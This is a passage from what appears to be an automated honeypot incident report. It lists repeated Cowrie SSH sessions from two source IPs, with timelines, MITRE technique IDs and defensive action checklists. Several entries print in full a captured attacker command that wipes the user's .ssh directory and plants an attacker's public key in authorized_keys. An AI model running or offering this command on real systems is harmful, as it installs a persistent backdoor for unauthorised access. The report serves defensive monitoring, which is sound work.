| `2026-05-03 21:19:58` | `cowrie.session.params` |
| `2026-05-03 21:19:58` | `cowrie.command.input` |
| `2026-05-03 21:19:58` | `cowrie.session.file_download` |
| `2026-05-03 21:19:58` | `cowrie.log.closed` |
| `2026-05-03 21:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.35[.]6` to AbuseIPDB if not already reported
- [ ] Block `159.203.35[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ed7d9095643

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:19 |
| **Last Seen** | 2026-05-03 21:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:19:56` | `cowrie.session.connect` |
| `2026-05-03 21:19:56` | `cowrie.client.version` |
| `2026-05-03 21:19:56` | `cowrie.client.kex` |
| `2026-05-03 21:19:57` | `cowrie.login.success` |
| `2026-05-03 21:19:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17db8c3dd771

| Field | Detail |
|---|---|
| **Source IP** | `159.203.35[.]6` |
| **First Seen** | 2026-05-03 21:20 |
| **Last Seen** | 2026-05-03 21:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:20:01` | `cowrie.session.connect` |
| `2026-05-03 21:20:01` | `cowrie.client.version` |
| `2026-05-03 21:20:01` | `cowrie.client.kex` |
| `2026-05-03 21:20:02` | `cowrie.login.success` |
| `2026-05-03 21:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.35[.]6` to AbuseIPDB if not already reported
- [ ] Block `159.203.35[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b45aef6b2c84

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:20 |
| **Last Seen** | 2026-05-03 21:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:20:50` | `cowrie.session.connect` |
| `2026-05-03 21:20:50` | `cowrie.client.version` |
| `2026-05-03 21:20:50` | `cowrie.client.kex` |
| `2026-05-03 21:20:50` | `cowrie.login.success` |
| `2026-05-03 21:20:51` | `cowrie.session.params` |
| `2026-05-03 21:20:51` | `cowrie.command.input` |
| `2026-05-03 21:20:51` | `cowrie.command.failed` |
| `2026-05-03 21:20:51` | `cowrie.log.closed` |
| `2026-05-03 21:20:51` | `cowrie.session.params` |
| `2026-05-03 21:20:51` | `cowrie.command.input` |
| `2026-05-03 21:20:51` | `cowrie.session.file_download` |
| `2026-05-03 21:20:51` | `cowrie.log.closed` |
| `2026-05-03 21:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17eb8d3e29b1

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:20 |
| **Last Seen** | 2026-05-03 21:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:20:53` | `cowrie.session.connect` |
| `2026-05-03 21:20:53` | `cowrie.client.version` |
| `2026-05-03 21:20:53` | `cowrie.client.kex` |
| `2026-05-03 21:20:53` | `cowrie.login.success` |
| `2026-05-03 21:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ca2500e903e

| Field | Detail |
|---|---|
| **Source IP** | `159.203.35[.]6` |
| **First Seen** | 2026-05-03 21:21 |
| **Last Seen** | 2026-05-03 21:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:21:31` | `cowrie.session.connect` |
| `2026-05-03 21:21:31` | `cowrie.client.version` |
| `2026-05-03 21:21:31` | `cowrie.client.kex` |
| `2026-05-03 21:21:32` | `cowrie.login.success` |
| `2026-05-03 21:21:32` | `cowrie.session.params` |
| `2026-05-03 21:21:32` | `cowrie.command.input` |
| `2026-05-03 21:21:32` | `cowrie.command.failed` |
| `2026-05-03 21:21:33` | `cowrie.log.closed` |
| `2026-05-03 21:21:33` | `cowrie.session.params` |
| `2026-05-03 21:21:33` | `cowrie.command.input` |
| `2026-05-03 21:21:34` | `cowrie.session.file_download` |
| `2026-05-03 21:21:34` | `cowrie.log.closed` |
| `2026-05-03 21:21:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.35[.]6` to AbuseIPDB if not already reported
- [ ] Block `159.203.35[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e4ad3c58822

| Field | Detail |
|---|---|
| **Source IP** | `159.203.35[.]6` |
| **First Seen** | 2026-05-03 21:21 |
| **Last Seen** | 2026-05-03 21:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:21:37` | `cowrie.session.connect` |
| `2026-05-03 21:21:37` | `cowrie.client.version` |
| `2026-05-03 21:21:37` | `cowrie.client.kex` |
| `2026-05-03 21:21:38` | `cowrie.login.success` |
| `2026-05-03 21:21:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.35[.]6` to AbuseIPDB if not already reported
- [ ] Block `159.203.35[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0f100279b4d

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:21 |
| **Last Seen** | 2026-05-03 21:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:21:46` | `cowrie.session.connect` |
| `2026-05-03 21:21:46` | `cowrie.client.version` |
| `2026-05-03 21:21:46` | `cowrie.client.kex` |
| `2026-05-03 21:21:47` | `cowrie.login.success` |
| `2026-05-03 21:21:47` | `cowrie.session.params` |
| `2026-05-03 21:21:47` | `cowrie.command.input` |
| `2026-05-03 21:21:47` | `cowrie.command.failed` |
| `2026-05-03 21:21:47` | `cowrie.log.closed` |
| `2026-05-03 21:21:47` | `cowrie.session.params` |
| `2026-05-03 21:21:47` | `cowrie.command.input` |
| `2026-05-03 21:21:47` | `cowrie.session.file_download` |
| `2026-05-03 21:21:47` | `cowrie.log.closed` |
| `2026-05-03 21:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c01d36f391

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:21 |
| **Last Seen** | 2026-05-03 21:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:21:49` | `cowrie.session.connect` |
| `2026-05-03 21:21:49` | `cowrie.client.version` |
| `2026-05-03 21:21:49` | `cowrie.client.kex` |
| `2026-05-03 21:21:50` | `cowrie.login.success` |
| `2026-05-03 21:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf6e42e26ff3

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:22 |
| **Last Seen** | 2026-05-03 21:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:22:42` | `cowrie.session.connect` |
| `2026-05-03 21:22:42` | `cowrie.client.version` |
| `2026-05-03 21:22:43` | `cowrie.client.kex` |
| `2026-05-03 21:22:43` | `cowrie.login.success` |
| `2026-05-03 21:22:43` | `cowrie.session.params` |
| `2026-05-03 21:22:43` | `cowrie.command.input` |
| `2026-05-03 21:22:43` | `cowrie.command.failed` |
| `2026-05-03 21:22:43` | `cowrie.log.closed` |
| `2026-05-03 21:22:44` | `cowrie.session.params` |
| `2026-05-03 21:22:44` | `cowrie.command.input` |
| `2026-05-03 21:22:44` | `cowrie.session.file_download` |
| `2026-05-03 21:22:44` | `cowrie.log.closed` |
| `2026-05-03 21:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70c7ac0ffff6

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:22 |
| **Last Seen** | 2026-05-03 21:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:22:45` | `cowrie.session.connect` |
| `2026-05-03 21:22:45` | `cowrie.client.version` |
| `2026-05-03 21:22:46` | `cowrie.client.kex` |
| `2026-05-03 21:22:46` | `cowrie.login.success` |
| `2026-05-03 21:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be4c1e3a7d46

| Field | Detail |
|---|---|
| **Source IP** | `159.203.35[.]6` |
| **First Seen** | 2026-05-03 21:23 |
| **Last Seen** | 2026-05-03 21:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:23:08` | `cowrie.session.connect` |
| `2026-05-03 21:23:08` | `cowrie.client.version` |
| `2026-05-03 21:23:08` | `cowrie.client.kex` |
| `2026-05-03 21:23:09` | `cowrie.login.success` |
| `2026-05-03 21:23:09` | `cowrie.session.params` |
| `2026-05-03 21:23:09` | `cowrie.command.input` |
| `2026-05-03 21:23:09` | `cowrie.command.failed` |
| `2026-05-03 21:23:10` | `cowrie.log.closed` |
| `2026-05-03 21:23:10` | `cowrie.session.params` |
| `2026-05-03 21:23:10` | `cowrie.command.input` |
| `2026-05-03 21:23:10` | `cowrie.session.file_download` |
| `2026-05-03 21:23:10` | `cowrie.log.closed` |
| `2026-05-03 21:23:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.35[.]6` to AbuseIPDB if not already reported
- [ ] Block `159.203.35[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c62905d04b4a

| Field | Detail |
|---|---|
| **Source IP** | `159.203.35[.]6` |
| **First Seen** | 2026-05-03 21:23 |
| **Last Seen** | 2026-05-03 21:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:23:14` | `cowrie.session.connect` |
| `2026-05-03 21:23:14` | `cowrie.client.version` |
| `2026-05-03 21:23:14` | `cowrie.client.kex` |
| `2026-05-03 21:23:15` | `cowrie.login.success` |
| `2026-05-03 21:23:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.35[.]6` to AbuseIPDB if not already reported
- [ ] Block `159.203.35[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-089f71a5b4f8

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:23 |
| **Last Seen** | 2026-05-03 21:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:23:36` | `cowrie.session.connect` |
| `2026-05-03 21:23:36` | `cowrie.client.version` |
| `2026-05-03 21:23:36` | `cowrie.client.kex` |
| `2026-05-03 21:23:37` | `cowrie.login.success` |
| `2026-05-03 21:23:37` | `cowrie.session.params` |
| `2026-05-03 21:23:37` | `cowrie.command.input` |
| `2026-05-03 21:23:37` | `cowrie.command.failed` |
| `2026-05-03 21:23:37` | `cowrie.log.closed` |
| `2026-05-03 21:23:37` | `cowrie.session.params` |
| `2026-05-03 21:23:37` | `cowrie.command.input` |
| `2026-05-03 21:23:37` | `cowrie.session.file_download` |
| `2026-05-03 21:23:37` | `cowrie.log.closed` |
| `2026-05-03 21:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0f850d18035

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:23 |
| **Last Seen** | 2026-05-03 21:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:23:39` | `cowrie.session.connect` |
| `2026-05-03 21:23:39` | `cowrie.client.version` |
| `2026-05-03 21:23:39` | `cowrie.client.kex` |
| `2026-05-03 21:23:40` | `cowrie.login.success` |
| `2026-05-03 21:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3067c415b822

| Field | Detail |
|---|---|
| **Source IP** | `159.203.35[.]6` |
| **First Seen** | 2026-05-03 21:23 |
| **Last Seen** | 2026-05-03 21:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:23:54` | `cowrie.session.connect` |
| `2026-05-03 21:23:54` | `cowrie.client.version` |
| `2026-05-03 21:23:54` | `cowrie.client.kex` |
| `2026-05-03 21:23:55` | `cowrie.login.success` |
| `2026-05-03 21:23:56` | `cowrie.session.params` |
| `2026-05-03 21:23:56` | `cowrie.command.input` |
| `2026-05-03 21:23:56` | `cowrie.command.failed` |
| `2026-05-03 21:23:56` | `cowrie.log.closed` |
| `2026-05-03 21:23:56` | `cowrie.session.params` |
| `2026-05-03 21:23:56` | `cowrie.command.input` |
| `2026-05-03 21:23:57` | `cowrie.session.file_download` |
| `2026-05-03 21:23:57` | `cowrie.log.closed` |
| `2026-05-03 21:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.35[.]6` to AbuseIPDB if not already reported
- [ ] Block `159.203.35[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffd4a8dd66f6

| Field | Detail |
|---|---|
| **Source IP** | `159.203.35[.]6` |
| **First Seen** | 2026-05-03 21:24 |
| **Last Seen** | 2026-05-03 21:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:24:00` | `cowrie.session.connect` |
| `2026-05-03 21:24:00` | `cowrie.client.version` |
| `2026-05-03 21:24:00` | `cowrie.client.kex` |
| `2026-05-03 21:24:01` | `cowrie.login.success` |
| `2026-05-03 21:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.35[.]6` to AbuseIPDB if not already reported
- [ ] Block `159.203.35[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04b7aa8fabbf

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
| **First Seen** | 2026-05-03 21:25 |
| **Last Seen** | 2026-05-03 21:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 21:25:23` | `cowrie.session.connect` |
| `2026-05-03 21:25:23` | `cowrie.client.version` |
| `2026-05-03 21:25:23` | `cowrie.client.kex` |
| `2026-05-03 21:25:24` | `cowrie.login.success` |
| `2026-05-03 21:25:24` | `cowrie.session.params` |
| `2026-05-03 21:25:24` | `cowrie.command.input` |
| `2026-05-03 21:25:24` | `cowrie.command.failed` |
| `2026-05-03 21:25:24` | `cowrie.log.closed` |
| `2026-05-03 21:25:25` | `cowrie.session.params` |
| `2026-05-03 21:25:25` | `cowrie.command.input` |
| `2026-05-03 21:25:25` | `cowrie.session.file_download` |
| `2026-05-03 21:25:25` | `cowrie.log.closed` |
| `2026-05-03 21:25:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.135[.]217` to AbuseIPDB if not already reported
- [ ] Block `152.32.135[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc47a3714b0d

| Field | Detail |
|---|---|
| **Source IP** | `152.32.135[.]217` |
